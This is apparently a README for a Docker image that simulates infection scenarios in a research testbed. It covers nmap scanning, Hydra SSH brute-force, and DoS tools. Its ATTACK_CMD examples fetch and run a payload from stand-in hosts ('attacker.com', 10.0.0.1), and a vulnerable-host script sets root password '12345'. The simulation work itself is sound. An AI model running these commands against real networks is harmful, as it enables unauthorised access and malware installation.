# Infection Scenario Docker Image

A containerized environment for simulating infection scenarios, including SSH brute-force attacks, vulnerability scanning, and post-exploitation activities.

## Purpose

This image simulates a complete attack chain:
1. **Network Discovery** - Scans target networks to discover live hosts and open services
2. **SSH Brute-Force** - Attempts to crack SSH credentials using Hydra
3. **Post-Exploitation** - Copies flag files and executes arbitrary commands on compromised hosts
4. **Vulnerability Scanning** - Can scan targets for web vulnerabilities using Nikto

## Available Tools

| Tool | Purpose |
|------|---------|
| `nmap` | Network discovery and port scanning |
| `hydra` | SSH brute-force password cracking |
| `nikto` | Web vulnerability scanner |
| `hping3` | TCP/UDP packet manipulation |
| `slowloris` | HTTP slow-rate DoS attack |
| `rapidresetclient` | RapidReset HTTP/3 attack tool |
| `ssh/sshpass` | SSH access and password-based authentication |
| `rsyslog` | System logging |

## Usage

### Environment Variables

| Variable | Default | Description |
|----------|---------|-------------|
| `TARGET_NETWORK` | (required) | Target network in CIDR notation (e.g., `192.168.1.0/24`) |
| `PASSWORD_LIST` | `10000_common_passwords` | Path to password list file for Hydra attacks |
| `ATTACK_CMD` | `touch /FLAG` | Command to execute on compromised hosts after gaining access |

### Command-Line Arguments

#### Attacker (`/app/attacker.py`)

```bash
# Using target network argument
python3 /app/attacker.py --target 192.168.1.0/24

# Using environment variable
TARGET_NETWORK=192.168.1.0/24 python3 /app/attacker.py

# Skip Hydra (for testing/debugging)
python3 /app/attacker.py --target 192.168.1.0/24 --skip_hydra

# Custom password list
PASSWORD_LIST=10_common_passwords python3 /app/attacker.py --target 192.168.1.0/24

# Custom attack command
ATTACK_CMD="wget http://attacker.com/malware -O /tmp/payload && chmod +x /tmp/payload && /tmp/payload" python3 /app/attacker.py --target 192.168.1.0/24
```

#### Attacker Shell Script (`/app/attacker.sh`)

```bash
# Using positional argument
/app/attacker.sh 192.168.1.0/24

# Using environment variable
TARGET_NETWORK=192.168.1.0/24 /app/attacker.sh

# Custom password list
PASSWORD_LIST=10_common_passwords /app/attacker.sh 192.168.1.0/24
```

#### Vulnerable Host (`/app/vulnerable.sh`)

```bash
# Sets up an SSH server with root password "12345"
/app/vulnerable.sh
```

## Examples

### Example 1: Full Infection Scenario

```yaml
# In a Kubernetes deployment
env:
  - name: TARGET_NETWORK
    value: "10.10.0.0/24"
  - name: ATTACK_CMD
    value: "wget http://10.0.0.1:8080/malware -O /tmp/malware && chmod +x /tmp/malware && /tmp/malware"
```

### Example 2: Quick Test Mode

```bash
# Skip actual attacks, just demonstrate the flow
python3 /app/attacker.py --target 192.168.1.0/24 --skip_hydra
```

### Example 3: Using MENTORED_IP_LIST.json Fallback

If no `--target` is specified and `/MENTORED_IP_LIST.json` exists, the attacker will automatically discover target IPs from the mentored testbed configuration:

```bash
python3 /app/attacker.py
```

## File Structure

```
/app/
├── attacker.py          # Main attacker script (Python)
├── attacker.sh          # Alternative attacker script (Shell)
├── vulnerable.sh        # Vulnerable host setup script
├── 10000_common_passwords  # Hydra password list (10K passwords)
├── 10_common_passwords     # Hydra password list (10 passwords)
├── file_attack_cmd.sh   # Generated attack command script
└── FLAG                 # Captured password from successful attack
```

## Notes

- The attacker uses nmap's ping scan (`-sn`) for fast host discovery
- Hydra uses the `-f` flag to stop after the first successful password
- All attack results and logs are saved to `/app/results/`
- SSH connections use `StrictHostKeyChecking=no` to avoid interactive prompts
